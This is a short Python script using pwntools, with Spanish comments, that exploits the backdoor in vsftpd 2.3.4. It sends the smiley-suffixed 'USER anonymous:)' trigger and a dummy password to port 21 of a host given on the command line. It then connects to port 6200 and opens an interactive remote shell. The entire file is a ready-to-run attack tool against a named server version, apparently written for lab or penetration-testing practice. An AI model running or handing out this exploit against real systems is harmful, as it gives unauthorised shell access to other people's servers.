#!/usr/bin/env python3

from pwn import *
import argparse

# Manejo de la señal SIGINT para una salida limpia
def handler(signal, frame):
    print("\n[!] Saliendo...")
    sys.exit(0)

signal.signal(signal.SIGINT, handler)

# Configuración de argumentos
parser = argparse.ArgumentParser(description='Exploit para el backdoor de vsftpd 2.3.4')
parser.add_argument("host", help="Dirección IP del servidor vulnerable", type=str)
args = parser.parse_args()

host = args.host
port_ftp = 21
port_backdoor = 6200

# Función para explotar el backdoor
def exploit():
    try:
        # Conexión al servidor FTP
        print(f"[*] Conectando al servidor FTP en {host}:{port_ftp}")
        ftp = remote(host, port_ftp)
        ftp_response = ftp.recvuntil(b"(vsFTPd 2.3.4)")
        print(f'Banner: {ftp_response}')

        # Enviar el usuario malicioso
        print("[*] Enviando usuario malicioso")
        ftp.sendline(b"USER anonymous:)")

        # Esperar la respuesta del servidor
        ftp.recvuntil(b"password.")

        # Enviar cualquier contraseña (no es necesaria)
        print("[*] Enviando contraseña")
        ftp.sendline(b"PASS pass")

        # Intentar conectarse al backdoor en el puerto 6200
        print(f"[*] Intentando conectarse al backdoor en {host}:{port_backdoor}")
        backdoor = remote(host, port_backdoor)

        # Si la conexión es exitosa, obtenemos una shell
        print("[+] Backdoor conectado al puerto 6200")
        print("[+] Shell interactiva abierta")
        backdoor.interactive()

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        # Cerrar las conexiones
        ftp.close()
        if 'backdoor' in locals():
            backdoor.close()

if __name__ == "__main__":
    exploit()
